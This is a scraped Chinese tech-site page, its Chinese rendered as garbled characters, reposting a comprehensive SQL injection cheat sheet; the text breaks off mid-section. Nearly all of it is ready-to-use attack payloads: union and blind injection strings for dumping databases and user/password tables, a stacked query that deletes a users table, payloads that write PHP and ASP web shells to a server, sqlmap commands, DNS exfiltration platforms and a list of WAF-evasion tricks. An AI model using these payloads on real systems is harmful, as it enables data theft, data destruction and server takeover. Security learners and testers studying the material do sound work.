<!doctype html><html lang=cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>è¿™å¯èƒ½æ˜¯æœ€å…¨çš„SQLæ³¨å…¥æ€»ç»“ï¼Œå¾ˆæœ‰ç”¨ | æå®¢å¿«è¨Š</title><meta property="og:title" content="è¿™å¯èƒ½æ˜¯æœ€å…¨çš„SQLæ³¨å…¥æ€»ç»“ï¼Œå¾ˆæœ‰ç”¨ - æå®¢å¿«è¨Š"><meta property="og:type" content="article"><meta property="og:locale" content="cn"><meta property="og:image" content="https://p1.pstatp.com/large/pgc-image/5ecee08979374b6abe43d0c2f441eff5"><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/00c2342.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/00c2342.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/00c2342.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/00c2342.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/00c2342.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/00c2342.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/00c2342.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/00c2342.html><meta property="article:published_time" content="2020-10-29T20:54:43+08:00"><meta property="article:modified_time" content="2020-10-29T20:54:43+08:00"><meta name=Keywords content><meta name=description content="è¿™å¯èƒ½æ˜¯æœ€å…¨çš„SQLæ³¨å…¥æ€»ç»“ï¼Œå¾ˆæœ‰ç”¨"><meta name=author content="æå®¢å¿«è¨Š"><meta property="og:url" content="/cn/%E7%A7%91%E6%8A%80/00c2342.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>ğŸ¤“ æå®¢å¿«è®¯ Geek Bank</a></h1><p class=description>ä¸ºä½ å¸¦æ¥æœ€å…¨çš„ç§‘æŠ€çŸ¥è¯† ğŸ§¡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>çŒœä½ å–œæ­¡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=ç§‘æŠ€>ç§‘æŠ€</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=éŠæˆ²>éŠæˆ²</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=ç§‘å­¸>ç§‘å­¸</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>è¿™å¯èƒ½æ˜¯æœ€å…¨çš„SQLæ³¨å…¥æ€»ç»“ï¼Œå¾ˆæœ‰ç”¨</h1></header><date class="post-meta meta-date">2020-10-29</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=cn/categories/%E7%A7%91%E6%8A%80.html>ç§‘æŠ€</a></span></div><div class=post-content><h1 class=pgc-h-arrow-right>SQLæ³¨å…¥åŸç†</h1><p>å½“å®¢æˆ·ç«¯æäº¤çš„æ•°æ®æœªä½œå¤„ç†æˆ–è½¬ä¹‰ç›´æ¥å¸¦å…¥æ•°æ®åº“ï¼Œå°±é€ æˆäº†sqlæ³¨å…¥ã€‚</p><p>æ”»å‡»è€…é€šè¿‡æ„é€ ä¸åŒçš„sqlè¯­å¥æ¥å®ç°å¯¹æ•°æ®åº“çš„ä»»æ„æ“ä½œã€‚</p><h1 class=pgc-h-arrow-right>SQLæ³¨å…¥çš„åˆ†ç±»</h1><p>æŒ‰å˜é‡ç±»å‹åˆ†ï¼šæ•°å­—å‹å’Œå­—ç¬¦å‹</p><p>æŒ‰HTTPæäº¤æ–¹å¼åˆ†ï¼šPOSTæ³¨å…¥ã€GETæ³¨å…¥å’ŒCookieæ³¨å…¥</p><p>æŒ‰æ³¨å…¥æ–¹å¼åˆ†ï¼šå¸ƒå°”æ³¨å…¥ã€è”åˆæ³¨å…¥ã€å¤šè¯­å¥æ³¨å…¥ã€æŠ¥é”™æ³¨å…¥ã€å»¶æ—¶æ³¨å…¥ã€å†…è”æ³¨å…¥</p><p>æŒ‰æ•°æ®åº“ç±»å‹åˆ†ï¼š</p><p>sqlï¼šoracleã€mysqlã€mssqlã€accessã€sqliteã€postgersqlnosqlï¼šmongodbã€redis</p><h1 class=pgc-h-arrow-right>MySQLä¸MSSQLåŠACCESSä¹‹é—´çš„åŒºåˆ«</h1><p>1.MySQL5.0ä»¥ä¸‹æ²¡æœ‰information_schemaè¿™ä¸ªé»˜è®¤æ•°æ®åº“</p><p>2.ACCESSæ²¡æœ‰åº“åï¼Œåªæœ‰è¡¨å’Œå­—æ®µï¼Œå¹¶ä¸”æ³¨å…¥æ—¶ï¼Œåé¢å¿…é¡»è·Ÿè¡¨åï¼ŒACCESSæ²¡æœ‰æ³¨é‡Š</p><p class=pgc-end-literature>ä¸¾ä¾‹ï¼šselect 1,2,3 from `table_name` union select 1,2,3 from `table_name`</p><p>3.MySQLä½¿ç”¨limitæ’åºï¼ŒACCESSä½¿ç”¨TOPæ’åºï¼ˆTOPåœ¨MSSQLä¹Ÿå¯ä½¿ç”¨ï¼‰</p><h1 class=pgc-h-arrow-right>åˆ¤æ–­ä¸‰ç§æ•°æ®åº“çš„è¯­å¥</h1><ul><li>MySQLï¼šand length(user())>10</li><li>ACCESSï¼šand (select count(*)from MSysAccessObjects)>0</li><li>MSSQLï¼šand (select count(*)from sysobjects)>0</li></ul><h1 class=pgc-h-arrow-right>åŸºæœ¬æ‰‹å·¥æ³¨å…¥æµç¨‹</h1><p><strong>1.åˆ¤æ–­æ³¨å…¥ç‚¹</strong></p><ul><li>æ•°å­—å‹ï¼šid=2-1</li><li>å­—ç¬¦å‹ï¼š' ã€')ã€ '))ã€ "ã€ ")ã€ "))</li><li>æ³¨é‡Šç¬¦ï¼š-- ï¼ˆè¿™æ˜¯--ç©ºæ ¼ï¼‰ã€--+ã€/**/ã€#</li></ul><div class=pgc-img><img alt=è¿™å¯èƒ½æ˜¯æœ€å…¨çš„SQLæ³¨å…¥æ€»ç»“ï¼Œå¾ˆæœ‰ç”¨ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/5ecee08979374b6abe43d0c2f441eff5><p class=pgc-img-caption></p></div><p><strong>2.è·å–å­—æ®µæ•°</strong></p><p>order by äºŒåˆ†æ³•è”åˆæŸ¥è¯¢å­—æ®µæ•°ï¼Œè§‚å¯Ÿé¡µé¢å˜åŒ–ä»è€Œç¡®å®šå­—æ®µæ•°</p><ul><li>order by 1</li><li>order by 50</li></ul><p>group by è¯‘ä¸ºåˆ†ç»„ï¼Œæ³¨å…¥æ—¶ä¹Ÿå¯ä½¿ç”¨ï¼Œä¸è¿‡æˆ‘æ²¡ç”¨è¿‡</p><p><strong>3.æŸ¥çœ‹æ˜¾ç¤ºä½å°è¯•ä½¿ç”¨è”åˆæ³¨å…¥</strong></p><p>åˆ©ç”¨and 1=2æˆ–and 0åŠid=-12æŸ¥çœ‹æ˜¾ç¤ºæ•°æ®çš„ä½ç½®</p><p>æ›¿æ¢æ˜¾ç¤ºä½æ”¹æˆSQLè¯­å¥ï¼ŒæŸ¥çœ‹ä¿¡æ¯ï¼ˆå½“å‰æ•°æ®åº“ï¼Œç‰ˆæœ¬åŠç”¨æˆ·åï¼‰</p><pre>and 1=2 union select version(),2,3</pre><p>å†æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“</p><pre>and 1=2 union select (select group_concat(schema_name)from information schema.schemata),2,3</pre><p>æŸ¥è¯¢æ‰€æœ‰è¡¨å</p><pre>union select (select group_concat(table_name)from information_schema.tables),2,3</pre><p>æŸ¥è¯¢æ‰€æœ‰å­—æ®µå</p><pre>union select (select group_concat(column_name)from information_schema.columns),2,3</pre><p>æŸ¥è¯¢å­—æ®µå†…å®¹</p><p>å¦‚ï¼šæŸ¥è¯¢teståº“ä¸‹usersè¡¨çš„idåŠunameå­—æ®µï¼Œç”¨'~'åŒºåˆ†idå’Œunameä»¥é˜²å­—ç¬¦è¿æ¥åˆ°ä¸€èµ·</p><pre>union select(select group_concat(id,'~',uname)from test.users),2,3</pre><h1 class=pgc-h-arrow-right>æŠ¥é”™æ³¨å…¥</h1><p>é€šç”¨æŠ¥é”™è¯­å¥ï¼šï¼ˆæµ‹è¯•ç‰ˆæœ¬MySQL8.0.12ï¼ŒMySQL5.0ï¼Œmariadb5.5ç‰ˆæœ¬ä¸‹ï¼‰</p><pre>select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</pre><p>POSTä¸­çš„æŠ¥é”™æ³¨å…¥</p><div class=pgc-img><img alt=è¿™å¯èƒ½æ˜¯æœ€å…¨çš„SQLæ³¨å…¥æ€»ç»“ï¼Œå¾ˆæœ‰ç”¨ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/a148a42516fa4226900e1dd7d9dd610c><p class=pgc-img-caption></p></div><h1 class=pgc-h-arrow-right>å¸ƒå°”ç›²æ³¨</h1><p>æˆ‘åœ¨ç›²æ³¨ä¸­å¸¸ç”¨çš„å‡½æ•°ï¼š</p><p>1.char() è§£ASCIIç ;</p><p>2.mid()æˆªå–å­—ç¬¦ä¸²;</p><p class=pgc-end-literature>ä¸¾ä¾‹ï¼šmid('hello',1,3)ï¼Œä»ç¬¬1ä½å¼€å§‹æˆªå–3ä½ï¼Œè¾“å‡ºä½hel</p><p>3.substr()ä¸mid()ç›¸åŒï¼Œéƒ½ä¸ºæˆªå–å­—ç¬¦ä¸²;</p><p>4.count()è®¡ç®—æŸ¥è¯¢ç»“æœçš„è¡Œæ•°;</p><p>5.concat()æŸ¥è¯¢ç»“æœåˆå¹¶ä½†ä¿æŒåŸæœ‰è¡Œæ•°;</p><p>6.group_concat()æŸ¥è¯¢ç»“æœåˆå¹¶ä½†éƒ½æ”¾åœ¨ä¸€è¡Œä¸­;</p><p>7.ascii() æŸ¥è¯¢asciiç ;</p><p>çŒœæ•°æ®åº“é•¿åº¦(åˆ©ç”¨äºŒåˆ†æ³•);</p><ul><li>id=1 and (length(database()))>1</li><li>id=1 and (length(database()))>50</li></ul><p>çŒœç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œç¬¬äºŒä¸ªå­—ç¬¦ï¼Œä»¥æ­¤ç±»æ¨</p><ul><li>and ascii(mid(database(),1,1))>1</li><li>and ascii(mid(database(),2,1))>1</li></ul><p>æŸ¥è¯¢å½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰è¡¨å;</p><pre>and (select count(table_name)from information_schema.tables where tables_schema=database())&gt;1and (select count(table_name)from information_schema.tables where tables_schema=database())&gt;10</pre><p>æŸ¥è¯¢ç¬¬ä¸€ä¸ªè¡¨çš„é•¿åº¦;</p><pre>and (select length(table_name)from information_schema.tables where tables_schema=database()limit 0,1)&gt;10</pre><p>æŸ¥è¯¢è¡¨çš„ç¬¬ä¸€ä¸ªå­—ç¬¦;</p><pre>and ascii(mid((select table_name from information_schema.tables where table_schema=database()limit 0,1),1,1))&gt;1</pre><p>æŸ¥è¯¢atelierè¡¨é‡Œæœ‰å‡ ä¸ªå­—æ®µ;</p><pre>and(select count(column_name)from information_schema.columns where table_name = 'atelier' and table_schema = database())&gt;2</pre><p>æŸ¥è¯¢ç¬¬ä¸€ä¸ªå­—æ®µé•¿åº¦;</p><pre>and length((select column_name from information_schema.columns where table_name='atelier' and table_schema= database()limit 0,1))&gt;1</pre><p>æŸ¥è¯¢å­—æ®µç¬¬ä¸€ä¸ªå­—ç¬¦;</p><pre>and ascii(mid((select column_name from information_schema.columns where table_schema = 'db83231_asfaa' and TABLE_NAME ='atelier' limit 0,1),1,1))&gt;105</pre><p>æŸ¥è¯¢å­—æ®µæ‰€æœ‰è¡Œæ•°;</p><pre>and (select count(*) from db83231_asfaa.atelier)&gt;4</pre><p>æŸ¥è¯¢å­—æ®µåçš„è¡Œæ•°ï¼ˆæŸ¥è¯¢emailsè¡¨ï¼Œunameå­—æ®µï¼‰;</p><pre>and (select count(uname)from security.emails)&gt;7 æŸ¥è¯¢unameçš„è¡Œæ•°</pre><p>æŸ¥è¯¢å­—æ®µå†…å®¹;</p><pre>length((select username from security.users limit 0,1))&gt;10ascii(mid((select username from security.user limit 0,1),1,1))&gt;100</pre><p>å°†æŸ¥è¯¢åˆ°çš„ASCIIç æ”¾åˆ°mysqlä¸­æŸ¥è¯¢ã€‚</p><p class=pgc-end-literature>ä¸¾ä¾‹ï¼šselect char(39);</p><div class=pgc-img><img alt=è¿™å¯èƒ½æ˜¯æœ€å…¨çš„SQLæ³¨å…¥æ€»ç»“ï¼Œå¾ˆæœ‰ç”¨ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/2aedd0e74cf14da19abf7db3019248b7><p class=pgc-img-caption></p></div><h1 class=pgc-h-arrow-right>å»¶æ—¶ç›²æ³¨</h1><p>åˆ©ç”¨sleep(3)å’Œif(1=2,1,0)åŠcaseè¿›è¡Œå»¶æ—¶æ³¨å…¥ï¼Œç¤ºä¾‹ï¼š</p><pre>select * from user where id='1' or sleep(3) %23</pre><p>è¿™ä¸ªæ²¡ä»€ä¹ˆå¥½è¯´çš„</p><pre>select * from user where id= 1 and if(length(version())&gt;10,sleep(3),0);</pre><p>å¦‚æœé•¿åº¦å¤§äº10ï¼Œåˆ™ç¡3ç§’ï¼Œå…¶ä»–åˆ™0ç§’</p><pre>select * from user where id= 1 and case length(version())&gt;10 when 1 then sleep(3) else 0 end;</pre><p>caseå®šä¹‰æ¡ä»¶ï¼Œwhen åé¢çš„1è¡¨ç¤ºtureä¹Ÿä»£è¡¨çœŸï¼Œå½“æ¡ä»¶ä¸ºçœŸæ—¶ï¼Œç¡3ç§’ï¼Œå…¶ä»–åˆ™0ç§’ã€‚</p><h1 class=pgc-h-arrow-right>å¤šè¯­å¥æ³¨å…¥</h1><p>å¤šè¯­å¥æ„æ€å°±æ˜¯å¯ä»¥æ‰§è¡Œå¤šä¸ªè¯­å¥ï¼Œåˆ©ç”¨åˆ†å·è¿›è¡Œéš”å¼€</p><pre>ç¤ºä¾‹ï¼šid=1";WAITFOR DELAY '0:0:3';delete from users; --+id=1';select if(length(user(),1,1)&gt;1,sleep(3),1) %23';select if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;1,sleep(3),1) %23</pre><h1 class=pgc-h-arrow-right>å†…è”æ³¨å…¥</h1><pre>ä¸¾ä¾‹ï¼šid=-1 /*!UNION*/ /*!SELECT*/ 1,2,3</pre><p>åˆ©ç”¨åˆ«åï¼š</p><pre>union select 1,2,3,4,a.id,b.id,* from(sys_admin as a inner join sys_admin as b on a.id=b.id)</pre><h1 class=pgc-h-arrow-right>getshell</h1><pre>id=-1' union select 1,2,(select '&lt;?php @eval($_POST[1]);?&gt;' into outfile '/var/www/html/404.php') --+</pre><p>ä¹Ÿå¯ä½¿ç”¨dumpfileè¿›è¡Œå†™å…¥ã€‚</p><p><strong>outfileå’Œdumpfileçš„åŒºåˆ«ï¼š</strong></p><p>outfileé€‚åˆå¯¼åº“ï¼Œåœ¨è¡Œæœ«å°¾ä¼šå†™å…¥æ–°è¡Œå¹¶è½¬ä¹‰ï¼Œå› æ­¤ä¸èƒ½å†™å…¥äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ã€‚dumpfileåªèƒ½æ‰§è¡Œä¸€è¡Œæ•°æ®ã€‚</p><p>æ•°æ®åº“å†™å…¥ï¼š</p><pre>exec master..xp_cmdshell 'echo "&lt;%eXECutegLobaL rEquEst(0)%&gt;" &gt; "c:\www\upload\Files\2019-11\404.asp"'</pre><h1 class=pgc-h-arrow-right>å®½å­—èŠ‚æ³¨å…¥</h1><p>å½“ç¼–ç ä½gbkæ—¶ï¼Œ%df%27æˆ–%81%27æ•°æ®ä¸ºç©º</p><p>å°±æ˜¯è¯´å®¢æˆ·ç«¯å‘é€çš„æ•°æ®ç¼–ç ä¸ºgbkæ—¶ï¼Œé‚£ä¹ˆå¯èƒ½ä¼šåƒæ‰è½¬ä¹‰å­—ç¬¦\åæ–œæ ï¼Œé—­åˆä¹‹åé¡µé¢æ¢å¤æ­£å¸¸ï¼Œå­˜åœ¨å®½å­—èŠ‚æ³¨å…¥</p><div class=pgc-img><img alt=è¿™å¯èƒ½æ˜¯æœ€å…¨çš„SQLæ³¨å…¥æ€»ç»“ï¼Œå¾ˆæœ‰ç”¨ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/f2e4069975654d02ab56173d40ec4d57><p class=pgc-img-caption></p></div><p>æµ‹è¯•å‡ºæ¥å°±å¯ä»¥ä½¿ç”¨sqlmapè·‘äº†ï¼Œ23333</p><p>åŠ *æ„é€ æ³¨å…¥ç‚¹ï¼ˆæ¯”-pæ›´ç¨³å®šï¼‰ï¼Œè®©sqlmapå¯¹æ„é€ æ³¨å…¥ç‚¹è¿›è¡Œæ³¨å…¥æ”»å‡»ï¼ˆ*ä¼˜å…ˆçº§æ›´é«˜ï¼‰</p><p>å®½å­—èŠ‚é˜²å¾¡ï¼š</p><div class=pgc-img><img alt=è¿™å¯èƒ½æ˜¯æœ€å…¨çš„SQLæ³¨å…¥æ€»ç»“ï¼Œå¾ˆæœ‰ç”¨ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/02b82817d9874c6facadb0abd88a0d0e><p class=pgc-img-caption></p></div><p>ç¬¬10è¡Œä»£ç å¿…é¡»å’Œç¬¬24è¡Œå¿…é¡»åŒæ—¶ä½¿ç”¨ï¼Œè¦ä¹ˆå°±æ›´æ¢ç¼–ç æ ¼å¼</p><h1 class=pgc-h-arrow-right>äºŒæ¬¡ç¼–ç æ³¨å…¥</h1><p>ä»£ç ä¸­æœ‰urldecode() å‡½æ•°</p><p>%2527 å…ˆè§£ç æˆ%27å†è§£ç æˆ'å•å¼•å·</p><pre>sqlmap -u http://192.168.100.141/index.php/author=123 --prefix "%2527" --suffix "%23"</pre><p>-prefixä¸ºè®¾ç½®å‰ç¼€ -suffixä¸ºè®¾ç½®åç¼€</p><p>è®¾ç½®åç¼€ï¼Œé˜²æ­¢sqlmapä½¿ç”¨å†…è”æ³¨</p><p>ä½¿ç”¨è‡ªå¸¦çš„è„šæœ¬è¿›è¡Œæ³¨å…¥chardoubleencode.py</p><div class=pgc-img><img alt=è¿™å¯èƒ½æ˜¯æœ€å…¨çš„SQLæ³¨å…¥æ€»ç»“ï¼Œå¾ˆæœ‰ç”¨ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/73d6d1dfe51f439e87195a073ff7df98><p class=pgc-img-caption></p></div><h1 class=pgc-h-arrow-right>å›¾ç‰‡ä¸Šä¼ sqlæ³¨å…¥</h1><p>çŒœç»“æ„ï¼Œä¸ºæ—¶é—´æˆ³åŠ æ–‡ä»¶å</p><div class=pgc-img><img alt=è¿™å¯èƒ½æ˜¯æœ€å…¨çš„SQLæ³¨å…¥æ€»ç»“ï¼Œå¾ˆæœ‰ç”¨ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/6fbf7c50198940f79a98048015be736e><p class=pgc-img-caption></p></div><div class=pgc-img><img alt=è¿™å¯èƒ½æ˜¯æœ€å…¨çš„SQLæ³¨å…¥æ€»ç»“ï¼Œå¾ˆæœ‰ç”¨ onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/2ee5fb35b3f74b3a99a5d67fbdd4a2a8><p class=pgc-img-caption></p></div><p>æ›¿æ¢and sleep(3) ä¸º*è¿›è¡Œsalmap</p><h1 class=pgc-h-arrow-right>äºŒæ¬¡æ³¨å…¥</h1><p>abc' æ•°æ®ç»è¿‡addslashesè¿‡æ»¤ï¼Œå•å¼•å·å‰é¢æ·»åŠ åæ–œæ abc\'ï¼Œä½†ä¼ åˆ°æ•°æ®åº“çš„æ•°æ®è¿˜æ˜¯abc'</p><p>å‡å¦‚åœ¨å¦‚ä¸‹åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬æµè§ˆä¸€äº›ç½‘ç«™çš„æ—¶å€™ï¼Œå¯ä»¥ç°åœ¨æ³¨å†Œè§é¡µé¢æ³¨å†Œusername=test'ï¼Œæ¥ä¸‹æ¥è®¿é—®xxx.php?username=test'ï¼Œé¡µé¢è¿”å›id=22ï¼›</p><p>æ¥ä¸‹æ¥å†æ¬¡å‘èµ·è¯·æ±‚xxx.php?id=22ï¼Œè¿™æ—¶å€™å°±æœ‰å¯èƒ½å‘ç”Ÿsqlæ³¨å…¥ï¼Œæ¯”å¦‚é¡µé¢ä¼šè¿”å›MySQLçš„é”™è¯¯ã€‚</p><p>è®¿é—®xxx.php?id=test' union select 1,user(),3%23ï¼Œè·å¾—æ–°çš„id=40ï¼Œå¾—åˆ°user()çš„ç»“æœï¼Œåˆ©ç”¨è¿™ç§æ³¨å…¥æ–¹å¼ä¼šå¾—åˆ°æ•°æ®åº“ä¸­çš„å€¼ã€‚</p><h1 class=pgc-h-arrow-right>XFFå¤´æ³¨å…¥</h1><pre>update user set loat_loginip = '8.8.8.8' where id =1 and sleep(5) #' where username = 'zs';</pre><p>idæ ¹æ®ç½‘ç«™ç”¨æˆ·é‡å–ä¸€ä¸ªä¸­é—´å€¼ï¼Œæµ‹è¯•æ˜¯å¦æœ‰æ³¨å…¥ï¼Œåˆ©ç”¨æ’ä»¶è®¾ç½®XFFå¤´ï¼Œå¦‚æœç½‘ç«™ä¸æŠ¥é”™ï¼Œå¯å°è¯•æ­¤æ³¨å…¥ï¼›</p><pre>X-Forward-Forï¼š127.0.0.1' select 1,2,user()</pre><div class=pgc-img><img alt=è¿™å¯èƒ½æ˜¯æœ€å…¨çš„SQLæ³¨å…¥æ€»ç»“ï¼Œå¾ˆæœ‰ç”¨ onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/75b96c8165db425f84c5eab1dbce1572><p class=pgc-img-caption></p></div><h1 class=pgc-h-arrow-right>User-Agentè¯·æ±‚å¤´æ³¨å…¥</h1><div class=pgc-img><img alt=è¿™å¯èƒ½æ˜¯æœ€å…¨çš„SQLæ³¨å…¥æ€»ç»“ï¼Œå¾ˆæœ‰ç”¨ onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/4693e7e7a8344831bce78da551122ea1><p class=pgc-img-caption></p></div><h1 class=pgc-h-arrow-right>DNSå¤–å¸¦æ—¥å¿—ç¤ºä¾‹</h1><p>å¤–å¸¦å¹³å° ï¼šxip.io ceye.io</p><p>MSSQLæŸ¥è¯¢å½“å‰æ•°æ®åº“ï¼›</p><div class=pgc-img><img alt=è¿™å¯èƒ½æ˜¯æœ€å…¨çš„SQLæ³¨å…¥æ€»ç»“ï¼Œå¾ˆæœ‰ç”¨ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/e3dcbbc64f1547f9a72a3fb9030a7935><p class=pgc-img-caption></p></div><div class=pgc-img><img alt=è¿™å¯èƒ½æ˜¯æœ€å…¨çš„SQLæ³¨å…¥æ€»ç»“ï¼Œå¾ˆæœ‰ç”¨ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/d3a6f29d7b374b1da9fd713306b60476><p class=pgc-img-caption></p></div><p><strong>MySQLæŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬ï¼›</strong></p><div class=pgc-img><img alt=è¿™å¯èƒ½æ˜¯æœ€å…¨çš„SQLæ³¨å…¥æ€»ç»“ï¼Œå¾ˆæœ‰ç”¨ onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/31fe3b12d61a4ab6a5c948e82fde4d80><p class=pgc-img-caption></p></div><div class=pgc-img><img alt=è¿™å¯èƒ½æ˜¯æœ€å…¨çš„SQLæ³¨å…¥æ€»ç»“ï¼Œå¾ˆæœ‰ç”¨ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/06eebf63ca5d42d69c3b7925d0340aea><p class=pgc-img-caption></p></div><h1 class=pgc-h-arrow-right>å¸¸ç”¨è¿‡WAFæŠ€å·§</h1><p><strong>1.ç‰¹å¾å­—ç¬¦å¤§å°å†™ï¼ˆåŸºæœ¬æ²¡ç”¨ï¼‰</strong></p><pre>UnIoN SeLcT 1,2,3</pre><p><strong>2.å†…è”æ³¨é‡Š</strong></p><pre>id=-1/*!UNION*/%20//*!SELECT*/%201,2,3</pre><p><strong>3.ç‰¹æ®Šå­—ç¬¦ä»£æ›¿ç©ºæ ¼</strong></p><p>%09 tabé”®(æ°´å¹³)ã€%0a æ¢è¡Œã€%0c æ–°çš„ä¸€é¡µ%0d returnåŠŸèƒ½ã€%0b tabé”®(å‚ç›´)ã€%a0ç©ºæ ¼</p><p><strong>4.ç­‰ä»·å‡½æ•°å’Œé€»è¾‘ç¬¦å·</strong></p><pre>hex()ã€bin()==&gt;ascii()sleep()==&gt;benchmark()concat_ws()==&gt;group_concat()mid()ã€substr()==&gt;substring()@@version==&gt;version()@@datadir==&gt;datadir()é€»è¾‘ç¬¦å·ï¼šå¦‚andå’Œorä¸èƒ½ä½¿ç”¨æ—¶ï¼Œå°è¯•&amp;&amp;å’Œ||åŒç®¡é“ç¬¦ã€‚</pre><p><strong>5.ç‰¹æ®Šç¬¦å·</strong></p><p>åå¼•å·ï¼Œselect `version()`ï¼Œç»•è¿‡ç©ºæ ¼å’Œæ­£åˆ™åŠ å·å’Œç‚¹ï¼Œ"+"å’Œ"."ä»£è¡¨è¿æ¥ï¼Œä¹Ÿå¯ç»•è¿‡ç©ºæ ¼å’Œå…³é”®å­—è¿‡æ»¤@ç¬¦å·ï¼Œç”¨äºå®šä¹‰å˜é‡ï¼Œä¸€ä¸ª@ä»£è¡¨ç”¨æˆ·å˜é‡ï¼Œ@@ä»£è¡¨ç³»ç»Ÿå˜é‡</p><p><strong>6.å…³é”®å­—æ‹†åˆ†</strong></p><pre>'se'+'lec'+'t'%S%E%L%C%T 1,2,3?id=1;EXEC('ma'+'ster..x'+'p_cm'+'dsh'+'ell"net user"')!å’Œ()ï¼š'or--+2=--!!!'2id=1+(UnI)(oN)+(SeL)(EcT)</pre><p><strong>7.åŠ æ‹¬å·ç»•è¿‡</strong></p><p>å°æ‹¬å·</p><pre>union (select+1,2,3+from+users)%23union(select(1),(2),(3)from(users))id=(1)or(0x50=0x50)id=(-1)union(((((((select(1),hex(2),hex(3)from(users))))))))</pre><p>èŠ±æ‹¬å·</p><pre>select{x user}from{x mysql.user}id=-1 union select 1,{x 2},3</pre><p><strong>8.è¿‡æ»¤andå’Œorä¸‹çš„ç›²æ³¨</strong></p><pre>id=strcmp(left((select%20username%20from%20users%20limit%200,1),1),0x42)%23id=strcmp(left((select+username+from+limit+0,1),1,0x42)%23</pre><p><strong>9.ç™½åå•ç»•è¿‡</strong></p><p>æ‹¦æˆªä¿¡æ¯ï¼š</p><pre>GET /pen/news.php?id=1 union select user,password from mysql.user</pre><p>ç»•è¿‡ï¼š</p><pre>GET /pen/news. php/admin?id=1 union select user,password from mysql. userGET /pen/admin/..\news. php?id=1 union select user,password from mysql. user</pre><p><strong>10.HTTPå‚æ•°æ§åˆ¶</strong></p><p>ï¼ˆ1ï¼‰HPPï¼ˆHTTP Parmeter Polutionï¼‰ï¼ˆé‡å¤å‚æ•°æ±¡æŸ“ï¼‰</p><p class=pgc-end-literature>ä¸¾ä¾‹ï¼š</p><pre>index.php?id=1 union select username,password from usersindex.php?id=1/**/union/*&amp;id=*/select/*&amp;id=*/username.password/*&amp;id=*/from/*&amp;id=*/users</pre><p>HPPåˆç§°ä½œé‡å¤å‚æ•°æ±¡æŸ“ï¼Œæœ€ç®€å•çš„æ˜¯?uid=1&uid=2&uid=3ï¼Œå¯¹äºè¿™ç§æƒ…å†µï¼Œä¸ç”¨çš„webæœåŠ¡å™¨å¤„ç†æ–¹å¼ä¸åŒã€‚</p><p>å…·ä½“WAFå¦‚ä½•å¤„ç†ï¼Œè¦çœ‹è®¾ç½®çš„è§„åˆ™ï¼Œä¸è¿‡ç¤ºä¾‹ä¸­æœ€åä¸€ä¸ªæœ‰è¾ƒå¤§å¯èƒ½ç»•è¿‡</p><p>ï¼ˆ2ï¼‰HPFï¼ˆHTTP Parmeter Fragmentï¼‰ï¼ˆHTTPåˆ†å‰²æ³¨å…¥ï¼‰</p><p>HTTPåˆ†å‰²æ³¨å…¥ï¼ŒåŒCRLFæœ‰ç›¸ä¼¼ä¹‹å¤„ï¼ˆä½¿ç”¨æ§åˆ¶å­—ç¬¦%0aã€%0dç­‰æ‰§è¡Œæ¢è¡Œï¼‰</p><p 